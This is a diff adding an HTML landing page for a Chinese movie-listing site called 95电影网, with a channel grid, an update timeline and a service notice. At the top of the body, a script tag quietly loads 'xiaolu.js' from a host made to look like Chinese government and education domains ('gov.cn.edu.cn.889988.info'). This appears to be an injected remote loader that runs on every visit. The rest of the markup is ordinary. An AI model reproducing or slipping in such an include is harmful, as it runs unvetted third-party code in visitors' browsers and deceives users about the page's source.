@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="95电影网,95dianyingwang,在线电影,院线新片,热播影视,免费看电影">
+<meta name="description" content="95电影网 - 聚焦年轻人的电影天地，院线新片与高分热播实时更新，陪你度过每一个观影时刻。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>95电影网 | 年轻人的电影天地 · 新片热播在线看</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:#0e1020;color:#eef0fa;line-height:1.65;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+:root{
+  --neon:#05d9ff;
+  --neon2:#7b5cff;
+  --pink:#ff4fa3;
+  --bg:#0e1020;
+  --card:#161a30;
+  --line:#262b48;
+  --txt:#eef0fa;
+  --txt2:#9099bd;
+}
+
+/* ===== Layout ===== */
+.wrap{max-width:1000px;margin:0 auto;padding:0 16px}
+
+/* ===== Topbar ===== */
+.topbar{
+  position:sticky;top:0;z-index:99;
+  background:rgba(14,16,32,.88);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line)
+}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:60px}
+.brand{display:flex;align-items:center;gap:10px}
+.brand .badge{
+  width:38px;height:38px;border-radius:11px;
+  background:linear-gradient(135deg,var(--neon),var(--neon2));
+  display:flex;align-items:center;justify-content:center;font-weight:900;font-size:15px;color:#fff;
+  box-shadow:0 0 18px rgba(5,217,255,.5)
+}
+.brand h1{font-size:19px;font-weight:900;letter-spacing:.5px}
+.brand h1 span{color:var(--neon)}
+.brand small{display:block;font-size:9px;color:var(--txt2);letter-spacing:1px;font-weight:400;margin-top:-2px}
+.nav{display:none;gap:4px}
+.nav a{padding:8px 16px;border-radius:10px;font-size:14px;font-weight:600;color:var(--txt2);transition:.2s}
+.nav a:hover,.nav a.act{color:#fff;background:rgba(123,92,255,.25)}
+.ham{display:flex;flex-direction:column;gap:5px;width:40px;height:40px;border:1px solid var(--line);border-radius:11px;align-items:center;justify-content:center;cursor:pointer}
+.ham i{width:18px;height:2px;background:var(--neon);border-radius:2px}
+
+/* ===== Side panel ===== */
+.panel{
+  position:fixed;inset:60px 0 0;z-index:98;background:rgba(14,16,32,.98);
+  transform:translateY(-102%);transition:transform .35s;padding:20px;overflow-y:auto
+}
+.panel.on{transform:translateY(0)}
+.panel a{display:flex;align-items:center;gap:14px;padding:16px;border-bottom:1px solid var(--line);font-size:16px;font-weight:700}
+.panel a i{width:8px;height:8px;border-radius:50%;background:var(--neon);box-shadow:0 0 10px var(--neon)}
+.panel a small{margin-left:auto;font-size:11px;color:var(--txt2);font-weight:400}
+
+/* ===== Hero (terminal) ===== */
+.hero{padding:40px 0 36px;text-align:center;position:relative;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(123,92,255,.25),transparent 60%);pointer-events:none}
+.hero .wrap{position:relative;z-index:1}
+.hero .tag{
+  display:inline-flex;align-items:center;gap:8px;font-size:11px;color:var(--neon);
+  border:1px solid rgba(5,217,255,.4);border-radius:20px;padding:6px 16px;margin-bottom:20px;
+  background:rgba(5,217,255,.06);font-weight:600
+}
+.hero .tag::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--neon);box-shadow:0 0 8px var(--neon);animation:blink 1.4s infinite}
+@keyframes blink{50%{opacity:.25}}
+.hero h2{font-size:32px;font-weight:900;line-height:1.3;margin-bottom:16px}
+.hero h2 em{font-style:normal;background:linear-gradient(90deg,var(--neon),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--txt2);font-size:14px;max-width:520px;margin:0 auto 26px}
+.hero .acts{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:6px;padding:13px 28px;border-radius:12px;font-weight:800;font-size:14px;border:1px solid transparent;cursor:pointer
+}
+.btn-main{background:linear-gradient(135deg,var(--neon),var(--neon2));color:#0e1020;box-shadow:0 8px 24px rgba(5,217,255,.35)}
+.btn-ghost{color:var(--txt);border-color:var(--line);background:rgba(255,255,255,.03)}
+
+/* ===== Section ===== */
+.sec{padding:30px 0}
+.sec-title{display:flex;align-items:baseline;gap:12px;margin-bottom:22px}
+.sec-title .num{font-size:13px;font-weight:900;color:var(--neon);opacity:.7;font-family:monospace}
+.sec-title h3{font-size:21px;font-weight:900}
+.sec-title a{margin-left:auto;font-size:12px;color:var(--txt2);font-weight:600}
+
+/* ===== Channel: Bento grid ===== */
+.bento{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.bento a{
+  position:relative;min-height:140px;border-radius:18px;overflow:hidden;
+  border:1px solid var(--line);background:var(--card);display:flex;flex-direction:column;justify-content:flex-end;padding:16px;
+  transition:transform .25s,border-color .25s
+}
+.bento a:active{transform:translateY(-4px);border-color:var(--neon)}
+.bento a.wide{grid-column:span 2;min-height:160px}
+.bento a.tall{grid-row:span 2;min-height:292px}
+.bento a .bg{position:absolute;inset:0;opacity:.5;z-index:0}
+.bento a .txt{position:relative;z-index:1}
+.bento a .txt strong{display:block;font-size:17px;font-weight:900}
+.bento a .txt small{display:block;font-size:11px;color:var(--txt2);margin-top:4px}
+.bento a .badge2{
+  position:absolute;top:14px;right:14px;z-index:1;font-size:10px;font-weight:700;color:#0e1020;
+  background:var(--neon);padding:3px 10px;border-radius:20px
+}
+.bento a .count{
+  position:absolute;bottom:14px;right:16px;z-index:1;font-size:11px;color:var(--neon);font-family:monospace
+}
+
+/* ===== Timeline ===== */
+.tl{position:relative;padding-left:8px}
+.tl-item{position:relative;padding:0 0 20px 26px;border-left:1px dashed var(--line)}
+.tl-item:last-child{border-left-color:transparent}
+.tl-item::before{
+  content:"";position:absolute;left:-6px;top:6px;width:11px;height:11px;border-radius:50%;
+  background:var(--bg);border:2px solid var(--neon2);box-shadow:0 0 10px rgba(123,92,255,.6)
+}
+.tl-item .box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px 18px;transition:.2s}
+.tl-item .box:hover{border-color:var(--neon2)}
+.tl-item .box .top{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.tl-item .box .top time{font-size:11px;color:var(--neon);font-family:monospace;font-weight:700}
+.tl-item .box .top span{font-size:10px;color:var(--txt2);border:1px solid var(--line);padding:2px 8px;border-radius:20px}
+.tl-item .box h4{font-size:15px;font-weight:800;margin-bottom:4px}
+.tl-item .box p{font-size:12px;color:var(--txt2)}
+
+/* ===== Notice ===== */
+.notice{
+  background:linear-gradient(135deg,var(--card),rgba(123,92,255,.1));
+  border:1px solid var(--line);border-radius:20px;padding:24px
+}
+.notice dl{display:grid;grid-template-columns:1fr;gap:16px}
+.notice .row{display:flex;gap:16px;align-items:flex-start}
+.notice .row .ic{width:44px;height:44px;border-radius:13px;flex:0 0 44px;display:flex;align-items:center;justify-content:center;font-size:20px;background:rgba(5,217,255,.1);border:1px solid rgba(5,217,255,.3)}
+.notice .row .tx strong{display:block;font-size:15px;font-weight:800;margin-bottom:3px}
+.notice .row .tx p{font-size:12px;color:var(--txt2);line-height:1.7}
+
+/* ===== Footer ===== */
+footer{background:#0a0c18;border-top:1px solid var(--line);padding:32px 0 38px;text-align:center}
+footer .links{display:flex;gap:22px;justify-content:center;flex-wrap:wrap;margin-bottom:18px}
+footer .links a{font-size:13px;color:var(--txt2);font-weight:600}
+footer .links a:hover{color:var(--neon)}
+footer p{font-size:11px;color:#5f6688;margin-bottom:5px}
+footer .site{color:var(--neon);font-weight:800;font-size:13px;margin-bottom:14px}
+
+/* ===== Top ===== */
+.top{
+  position:fixed;right:14px;bottom:20px;z-index:90;width:46px;height:46px;border-radius:14px;
+  background:linear-gradient(135deg,var(--neon),var(--neon2));color:#0e1020;font-weight:900;font-size:18px;
+  display:none;align-items:center;justify-content:center;box-shadow:0 8px 24px rgba(5,217,255,.4)
+}
+.top.on{display:flex}
+
+@media(min-width:640px){
+  .hero h2{font-size:44px}
+  .bento{grid-template-columns:repeat(3,1fr)}
+  .notice dl{grid-template-columns:1fr 1fr}
+}
+@media(min-width:860px){
+  .nav{display:flex}.ham{display:none}
+  .bento{grid-template-columns:repeat(4,1fr)}
+  .bento a.tall{min-height:160px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Topbar -->
+<div class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="badge">95</div>
+      <div>
+        <h1>95<span>电影网</span></h1>
+        <small>95DIANYINGWANG</small>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="act">首页</a>
+      <a href="#channel">频道导航</a>
+      <a href="#update">更新动态</a>
+      <a href="#notice">服务说明</a>
+    </nav>
+    <div class="ham" onclick="document.getElementById('panel').classList.toggle('on')"><i></i><i></i><i></i></div>
+  </div>
+</div>
+
+<nav class="panel" id="panel">
+  <a href="#home" onclick="this.parentNode.classList.remove('on')"><i></i>首页 <small>Home</small></a>
+  <a href="#channel" onclick="this.parentNode.classList.remove('on')"><i></i>频道导航 <small>Channel</small></a>
+  <a href="#update" onclick="this.parentNode.classList.remove('on')"><i></i>更新动态 <small>Update</small></a>
+  <a href="#notice" onclick="this.parentNode.classList.remove('on')"><i></i>服务说明 <small>Notice</small></a>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <span class="tag">SYSTEM ONLINE · 95电影网</span>
+    <h2>属于 <em>95后</em> 的电影天地<br>新片热播 一网打尽</h2>
+    <p>院线新片、高分热播、经典回看 —— 95电影网为你实时聚合年轻人爱看的每一部好片，轻松开启观影时光。</p>
+    <div class="acts">
+      <a class="btn btn-main" href="#channel">开始探索 →</a>
+      <a class="btn btn-ghost" href="#notice">了解服务</a>
+    </div>
+  </div>
+</section>
+
+<!-- Channel: Bento -->
+<section class="sec" id="channel">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="num">01</span><h3>频道导航</h3>
+      <a href="#">全部频道 ›</a>
+    </div>
+    <div class="bento">
+      <a class="wide" href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#1a237e,#4a148c)"></div>
+        <span class="badge2">HOT</span>
+        <div class="txt"><strong>院线新片</strong><small>同步院线 · 抢先看好片</small></div>
+        <span class="count">128 部</span>
+      </a>
+      <a href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#004d40,#00695c)"></div>
+        <div class="txt"><strong>高分榜</strong><small>豆瓣高分精选</small></div>
+        <span class="count">86 部</span>
+      </a>
+      <a href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#b71c1c,#880e4f)"></div>
+        <div class="txt"><strong>动作大片</strong><small>肾上腺素飙升</small></div>
+        <span class="count">64 部</span>
+      </a>
+      <a class="tall" href="#">
+        <div class="bg" style="background:linear-gradient(160deg,#1a237e,#0d47a1,#311b92)"></div>
+        <span class="badge2">NEW</span>
+        <div class="txt"><strong>科幻宇宙</strong><small>星际 · 末日 · 赛博<br>探索无限想象世界</small></div>
+        <span class="count">52 部</span>
+      </a>
+      <a href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#e65100,#bf360c)"></div>
+        <div class="txt"><strong>爆笑喜剧</strong><small>解压治愈首选</small></div>
+        <span class="count">73 部</span>
+      </a>
+      <a href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#4a148c,#311b92)"></div>
+        <div class="txt"><strong>悬疑烧脑</strong><small>反转不断高能</small></div>
+        <span class="count">41 部</span>
+      </a>
+      <a class="wide" href="#">
+        <div class="bg" style="background:linear-gradient(135deg,#004d40,#1b5e20)"></div>
+        <div class="txt"><strong>经典回看 · 每一部都值得重温</strong><small>华语经典 / 世界名片 / 年代佳作</small></div>
+        <span class="count">200+ 部</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- Update: Timeline -->
+<section class="sec" id="update">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="num">02</span><h3>更新动态</h3>
+      <a href="#">更新日志 ›</a>
+    </div>
+    <div class="tl">
+      <div class="tl-item">
+        <div class="box">
+          <div class="top"><time>2026.10.03</time><span>今日上新</span></div>
+          <h4>《星际远征2》上线 4K 高清版本</h4>
+          <p>科幻冒险续作归来，沉浸式视听体验全面升级。</p>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="box">
+          <div class="top"><time>2026.10.02</time><span>榜单更新</span></div>
+          <h4>本周热播榜 TOP10 重新洗牌</h4>
+          <p>多部新片强势入围，快来看看你追的片上榜没。</p>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="box">
+          <div class="top"><time>2026.10.01</time><span>频道扩充</span></div>
+          <h4>新增「经典回看」专属频道</h4>
+          <p>200+ 部华语与世界经典影片，一次看个够。</p>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="box">
+          <div class="top"><time>2026.09.28</time><span>体验升级</span></div>
+          <h4>移动端播放体验全面优化</h4>
+          <p>加载更快、切换更顺，手机看片更轻松。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Notice -->
+<section class="sec" id="notice">
+  <div class="wrap">
+    <div class="sec-title">
+      <span class="num">03</span><h3>服务说明</h3>
+      <a href="#">常见问题 ›</a>
+    </div>
+    <div class="notice">
+      <dl>
+        <div class="row">
+          <div class="ic">🎬</div>
+          <div class="tx"><strong>内容聚合</strong><p>95电影网专注影片信息推荐与内容展示，为你精选优质影视资源。</p></div>
+        </div>
+        <div class="row">
+          <div class="ic">🔄</div>
+          <div class="tx"><strong>每日更新</strong><p>院线新片、热播榜单、高分佳作每日实时更新，紧跟影视热点。</p></div>
+        </div>
+        <div class="row">
+          <div class="ic">📱</div>
+          <div class="tx"><strong>多端适配</strong><p>手机、平板、电脑全端自适应，随时随地轻松观影。</p></div>
+        </div>
+        <div class="row">
+          <div class="ic">💬</div>
+          <div class="tx"><strong>意见反馈</strong><p>有任何建议或问题，欢迎通过联系渠道与我们沟通。</p></div>
+        </div>
+      </dl>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="wrap">
+    <div class="links">
+      <a href="#">网站首页</a>
+      <a href="#">频道导航</a>
+      <a href="#">更新日志</a>
+      <a href="#">服务说明</a>
+      <a href="#">联系我们</a>
+    </div>
+    <p class="site">https://95dianyingwang-wap.github.io</p>
+    <p>© 2026 95电影网 · 95dianyingwang 保留所有权利</p>
+    <p>本站为影视信息推荐平台，相关影片版权归原作者所有</p>
+  </div>
+</footer>
+
+<div class="top" id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+
+<script>
+window.addEventListener('scroll',function(){
+  document.getElementById('top').classList.toggle('on',window.scrollY>400);
+});
+</script>
+</body>
+</html>
